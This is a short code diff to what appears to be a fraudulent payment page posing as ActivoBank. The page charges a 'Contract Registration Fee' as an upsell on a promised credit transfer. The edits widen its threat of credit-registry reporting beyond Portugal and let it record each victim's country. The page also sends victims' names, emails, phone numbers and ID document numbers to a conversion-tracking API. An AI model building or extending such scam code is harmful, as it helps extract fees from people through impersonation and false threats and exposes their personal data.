@@ -120,7 +120,7 @@ window.apiUrl = window.apiUrl || function (p) {
       </div>
       <div>
         <strong style="display:block;font-size:13px;font-weight:700;color:#dc2626;margin-bottom:4px;">Attention</strong>
-        <span style="font-size:13px;color:#7f1d1d;line-height:1.5;">Non-payment of this fee may result in cancellation of the transfer of funds and reporting to the Bank of Portugal's Credit Liabilities List.</span>
+        <span style="font-size:13px;color:#7f1d1d;line-height:1.5;">Non-payment of this fee may result in cancellation of the transfer of funds and reporting to your national credit liabilities registry.</span>
       </div>
     </div>
 
@@ -190,7 +190,7 @@ async function sendUtmify(status,orderId,createdAt,approvedDate){
   try{
     await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'pix',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
-        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
+        customer:{name:nome,email,phone:phone||null,document:doc,country:(localStorage.getItem('phoneCountryIso')||'PT')},
         products:[{id:'taxa-registo-contrato',name:'Contract Registration Fee — ActivoBank Credit',planId:null,planName:'upsell 5',quantity:1,priceInCents:cents}],
         trackingParameters:getUtmParams(),
         commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
